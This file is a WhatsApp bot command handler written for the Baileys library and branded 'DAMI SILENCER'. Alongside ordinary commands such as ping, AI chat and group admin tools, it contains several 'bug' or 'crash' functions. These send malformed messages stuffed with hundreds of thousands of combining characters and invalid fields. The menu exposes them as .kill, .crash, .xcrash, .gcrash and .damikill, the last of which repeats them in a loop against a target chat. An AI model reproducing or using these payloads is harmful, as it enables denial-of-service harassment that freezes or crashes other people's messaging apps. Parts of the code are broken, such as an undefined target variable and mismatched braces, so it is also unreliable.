require('./system/config');
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const util = require('util')
const chalk = require('chalk')
const axios = require('axios')
const { performance } = require('perf_hooks');
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser, } = require("./system/premium.js")
const { getBuffer, getGroupAdmins, getSizeMedia, formatSize, checkBandwidth, formatp, fetchJson, reSize, sleep, isUrl, runtime } = require('./system/func');

// Function import message depuis index.js
module.exports = async function zynHandler(ask, m, msg, store) {
    try {
            
//Function message extract chanel group 
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "messageContextInfo" ?
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
            m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
            m.text : "");

        if (!m.message || !m.key || !m.key.remoteJid) return;

        const remoteJid = m.key.remoteJid;
        if (remoteJid.startsWith("status@")) return;
//======================
const startTime = Date.now();
const sender = m.key.fromMe ? ask.user.id.split(":")[0] + "@s.whatsapp.net" || ask.user.id : m.key.participant || m.key.remoteJid;
const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
         const prefix = ".";
        if (!body.startsWith(prefix)) return;

        const command = body.slice(1).split(" ")[0].toLowerCase();
        const args = body.split(" ").slice(1);
        const text = args.join(" ");
        const quoted = m.quoted ? m.quoted : m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const mime = (quoted?.message || quoted)?.mimetype || "";
const from = m.key.remoteJid;
const isCreator = m.sender == owner + "@s.whatsapp.net" ? true : m.fromMe ? true : false;
const isGroup = from.endsWith("@g.us");
const kontributor = JSON.parse(fs.readFileSync('./system/database/owner.json'));
const crypto = require('crypto');
const randomArray = crypto.randomBytes(16);
console.log(randomArray.toString('hex'));
console.log(Buffer.from(randomArray).toString('hex'));
const botNumber = await ask.decodeJid(ask.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
const isCmd = budy.startsWith(prefix);
const pushname = m.pushName || "No Name";
const isMedia = /image|video|sticker|audio/.test(mime);
const groupMetadata = isGroup ? await ask.groupMetadata(m.chat).catch((e) => { }) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const premium = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isPremium = premium.includes(m.sender);

        const now = new Date();
        const options = { timeZone: 'Africa/Libreville', hour12: false };
        const time = now.toLocaleTimeString('fr-FR', options);
        const day = now.toLocaleDateString('fr-FR', { weekday: 'long', timeZone: 'Africa/Libreville' });
        const date = now.toLocaleDateString('fr-FR', { day: 'numeric', month: 'long', year: 'numeric', timeZone: 'Africa/Libreville' });

        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "DAMI_SILENCER" +  "ꦹꦹꦹ".repeat(10000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(10000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await ask.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }        

async function bugios(target) {
      let DAMI_SILENCER = "ꦹꦹꦹ".repeat(600000);
      await ask.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: ASK_XMD,
            url: "https://wa.me/2349120185747",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }                            
async function bugios2(target) {
  await ask.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `DAMI_SILENCER` + "࣯ꦾ".repeat(120000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "DAMI_SILENCER" + "ꦾ".repeat(120000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
  console.log(`Message envoyé à ${target}`);
}

async function func1(target) {
  if (!target.endsWith('@s.whatsapp.net')) {
    target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  }

  await ask.sendMessage(
    target,
    {
      text: "DAMI SILENCER " + "ꦹ".repeat(2000)
    },
    {
      ephemeralExpiration: 0,
      quoted: null
    }
  );
}
async function ask9(target, ptcp = false) {
let BetaFc = "DAMI-SILENCER" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "ask nih deck" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
return messageContent
}
async function ask10(target) {
 await ask.sendMessage(target, {
    groupMentionedMessage: {
        message: {
            interactiveMessage: {
            header: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0
                },
                hasMediaAttachment: true
            },
         body: {
         text: `𝐁𝐮𝐠`+'ꦾ'.repeat(100000)
         },
         nativeFlowMessage: {},
         contextInfo: {
         mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
         groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "DAMI-SILENCER" }]
        }}}}}, { participant: { jid: target } }, { messageId: null });
}

        if (!ask.public) {
            if (!m.key.fromMe) return;
        }
        console.log(chalk.blue('╭─────────────────────────────❀'));
        console.log(chalk.blue('JOKER BUG !'));
        console.log(chalk.blue('├─────────────────────────────'));
        console.log(chalk.blue(`│ 📅 Date : `) + chalk.cyan(new Date().toLocaleString()));
        console.log(chalk.blue(`│ 💬 Message : `) + chalk.white(m.body || m.mtype));
        console.log(chalk.blue(`│ 👤 Sender : `) + chalk.magenta(m.pushname));
        console.log(chalk.blue(`│ 📱 Number : `) + chalk.red(senderNumber));
        if (m.isGroup) {
            console.log(chalk.blue('├─────────────────────────────'));
            console.log(chalk.blue(`│ 👥 Group : `) + chalk.green(groupName));
            console.log(chalk.blue(`│ Gp participant : `) + chalk.red(participants.length));
            console.log(chalk.blue(`│ 🆔 Group id: `) + chalk.red(m.chat));
        }
        console.log(chalk.blue('╰─────────────────────────────❀\n'));

        switch (command) {



            case 'menu':
                await ask.sendMessage(m.chat, { react: { text: "📋", key: m.key } });
                ask.sendMessage(m.chat, { image : { url: 'exodus.jpg' },
                    caption: `
*╭════〘〘 𝑫𝑨𝑴𝑰 𝑰𝑺 𝑯𝑰𝑴 〙〙*
*┃❍ ᴍᴏᴅᴇ : Public*
*┃❍ ᴘʀᴇғɪx : [ . ]*
*┃❍ ᴅᴇᴠ : DAMINI*
*┃❍ ᴠᴇʀsɪᴏɴs : 1.0.0*
*┃❍ Contributor : XTRAVA*
*╰════════════════⊷*
*╭─────────────────────────────❀*
*│ BOT MENU*
*├─────────────────────────────*
*│ 1. .ping*
*│ 2. .speed*
*│ 3. .owner*
*│ 4. .ai <question>*
*│ 5. .imagen <texte>*
*│ 6. .delcase <nom du cas>*
*│ 7. .addcase <code du cas>*
*│ 8. .private*
*│ 9. .public*
*│ 10. .kill*
*│ 11. .rip*
*│ 12. .bugios*
*│ 13. .gcrash*
*│ 14. .crash* 
*│ 15. .xcrash*
*│ 16. .damikill*
*│ 17. .hidetag | ht <texte>*
*│ 18. .promote @tag*
*│ 19. .demote @tag*
*╰─────────────────────────────❀*

> Powered by DAMI`} );

                break;

            case 'kill': {
                await ask.sendMessage(m.chat, { react: { text: "💀", key: m.key } });
                if (!isCreator) return m.reply('Only the owner can use this command.');
                await ask.sendMessage(m.chat, ask9);
                break;
            }
            case 'rip': {
                await ask.sendMessage(m.chat, { react: { text: "⚰️", key: m.key } });
                if (!isCreator) return m.reply('Only the owner can use this command.');
                await ask10(m.chat);
                break;
            }
            case 'crash': {
                await ask.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
                if (!isCreator) return m.reply('Only the owner can use this command.');
                await func1(m.chat);
                break;
            }
            case 'xcrash': {
                await ask.sendMessage(m.chat, { react: { text: "💣", key: m.key } });
                if (!isCreator) return m.reply('only the owner can use this command.');
                await newsLetter(m.chat);
                break;
            }
            
            case 'bugios': {
                await ask.sendMessage(m.chat, { react: { text: "💣", key: m.key } });
                if (!isCreator) return m.reply('only the owner can use this command.');
                await bugios(m.chat);
                break;
            }

            case 'gcrash': {
                await ask.sendMessage(m.chat, { react: { text: "💣", key: m.key } });
                if (!isCreator) return m.reply('only the owner can use this command.');
                await bugios2(m.chat);
                break;
            }

            case 'damikill': {
                await ask.sendMessage(m.chat, { react: { text: "💀💣", key: m.key } });
                for (let i = 0; i < 20; i++) {  
                    await ask10(target)
                    await ask.sendMessage(m.chat, ask9);
                    await func1(target, ask)
                    await newsLetter(target)
                    await bugios(target)
                    await bugios2(target)
                }
                break;
            }
            case 'ping': {
                await ask.sendMessage(m.chat, { react: { text: "🏓", key: m.key } });
                const ping = performance.now() - startTime;
                m.reply(`Pong! 🏓\n\nping iss : ${ping.toFixed(2)} ms`);
                break;
            }
            case 'speed': {
                await ask.sendMessage(m.chat, { react: { text: "⚡", key: m.key } });
                const speed = performance.now() - startTime;
                m.reply(`Vitesse : ${speed.toFixed(2)} ms`);
                break;
            }
            case 'owner': {
                await ask.sendMessage(m.chat, { react: { text: "👑", key: m.key } });
                const ownerMessage = `*Owner t :*\n\n*Name :* ${ask.user.name}\n*Number :* ${ask.user.id.split('@')[0]}\n*ID :* ${ask.user.id}`;
                m.reply(ownerMessage);
                break;
            }

          case 'ai': {
    await ask.sendMessage(m.chat, { react: { text: "🤖", key: m.key } });
    if (!text) return m.reply('Enter your question or request.');
    try {
        const response = await axios.get('https://text.pollinations.ai/' + text);
        const aiResponse = response.data;
        m.reply(aiResponse);
    } catch (err) {
        m.reply('Error while processing AI request.');
        ask.sendMessage("237670171019@s.whatsapp.net", {
            text: "──✧* 𝕯𝖆𝖒𝖎’𝖘 𝖘𝖎𝖑𝖊𝖓𝖈𝖊𝖗 *✧───\n⚠️ Hi Developer, AI command error!\n\n" + util.format(err)
        });
    }
    break;
}

case 'imagen': {
    await ask.sendMessage(m.chat, { react: { text: "🖼️", key: m.key } });
    if (!text) return m.reply('Enter text to generate an image.');
    try {
        const imageUrl = `https://images.pollinations.ai/prompt/${encodeURIComponent(text)}`;
        await ask.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Generated image for: ${text}` });
    } catch (err) {
        m.reply('Error while generating the image.');
        ask.sendMessage("237670171019@s.whatsapp.net", {
            text: "──✧* 𝕯𝖆𝖒𝖎’𝖘 𝖘𝖎𝖑𝖊𝖓𝖈𝖊𝖗 *✧───\n⚠️ Hi Developer, Image command error!\n\n" + util.format(err)
        });
    }
    break;
}

case 'delcase': {
    await ask.sendMessage(m.chat, { react: { text: "🗑️", key: m.key } });
    if (!isCreator) m.reply('Only the owner can use this command.');
    if (!text) return m.reply('Enter the name of the case to delete.');
    const fs = require('fs');
    const nameFile = 'xmd.js';
    fs.readFile(nameFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading the file:', err);
            return m.reply('Failed to read the file.');
        }
        const casePattern = new RegExp(`case ['"]${text}['"]:[\\s\\S]*?break;`, 'g');
        if (!casePattern.test(data)) return m.reply(`Case '${text}' was not found`);
        const newContent = data.replace(casePattern, '');
        fs.writeFile(nameFile, newContent, 'utf8', (err) => {
            if (err) {
                console.error('Error writing the file:', err);
                return m.reply('Failed to delete the case.');
            }
            m.reply(`Case '${text}' deleted successfully.`);
        });
    });
    break;
}

case 'addcase': {
    await ask.sendMessage(m.chat, { react: { text: "➕", key: m.key } });
    if (!isCreator) return m.reply('Only the owner can use this command.');
    if (!text) return m.reply('Where is the case?');
    const fs = require('fs');
    const nameFile = 'xmd.js';
    const caseAsk = `${text}`;
    fs.readFile(nameFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading the file:', err);
            return m.reply('Failed to read the file.');
        }
        const poseAsk = data.indexOf("switch (command) {");
        if (poseAsk !== -1) {
            const insert = poseAsk + "switch (command) {".length;
            const codeAsk = data.slice(0, insert) + '\n\n' + caseAsk + '\n' + data.slice(insert);
            fs.writeFile(nameFile, codeAsk, 'utf8', (err) => {
                if (err) m.reply('Error writing the file: ' + err);
                else m.reply('New case added successfully.');
            });
        } else {
            m.reply('Unable to find the switch declaration in the file.');
        }
    });
    break;
}

case "private": {
    await ask.sendMessage(m.chat, { react: { text: "🔒", key: m.key } });
    if (!isCreator) m.reply('Only the owner can use this command.');
    ask.public = false;
    m.reply('`PRIVATE MODE ACTIVATED`');
    break;
}

case "public": {
    await ask.sendMessage(m.chat, { react: { text: "🔓", key: m.key } });
    if (!isCreator) m.reply('Only the owner can use this command.');
    ask.public = true;
    m.reply('`PUBLIC MODE ACTIVATED`');
    break;
}

case "hidetag":
case "ht": {
    if (!isGroup) return m.reply(mess.group);
    if (!isCreator && !isAdmins) return m.reply(mess.owner);
    if (!m.quoted && !text) return m.reply(`*Send the command with text: ${prefix + command} <Text>*`);
    var teks = m.quoted ? m.quoted.text : text;
    var member = await groupMetadata.participants.map(e => e.id);
    ask.sendMessage(m.chat, { text: teks, mentions: [...member] });
    break;
}

case "promote": {
    if (!isGroup) return m.reply(mess.group);
    if (!isAdmins && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply("The bot is not an admin.");
    if (m.quoted || text) {
        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await ask.groupParticipantsUpdate(m.chat, [target], 'promote')
            .then(() => m.reply(`*Success 🥳 User ${target.split("@")[0]} is now an admin*`))
            .catch((err) => m.reply(err.toString()));
    } else return m.reply("*Mention the person to promote\nExample: 241xxx/@tag");
    break;
}

case "demote": {
    if (!isGroup) return m.reply(mess.group);
    if (!isAdmins && !isCreator) return m.reply(mess.admin);
    if (!isBotAdmins) return m.reply("The bot is not an admin in this group.");
    if (m.quoted || text) {
        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        await ask.groupParticipantsUpdate(m.chat, [target], 'demote')
            .then(() => m.reply(`User ${target.split("@")[0]} is no longer an admin.`))
            .catch((err) => m.reply(err.toString()));
    } else return m.reply("Mention the person to demote\nExample: 241XX");
    break;
}

default: {
    await ask.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    await ask.sendMessage(m.key.remoteJid, {
        text: "Command not recognized, type *.menu* to see available options."
    });
    break;
}

} catch (err) {
    ask.sendMessage("237670171019@s.whatsapp.net", {
        text: "──✧* 𝕯𝖆𝖒𝖎’𝖘 𝖘𝖎𝖑𝖊𝖓𝖈𝖊𝖗 *✧───\n⚠️ Hi Developer, a feature error occurred!\n\n" + util.format(err)
    });
    console.log(chalk.red("Error in coeur.js =>"), err);
}

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.whiteBright('├'), chalk.keyword("red")("[ UPDATE ]"), __filename);
    delete require.cache[file];
    require(file);
});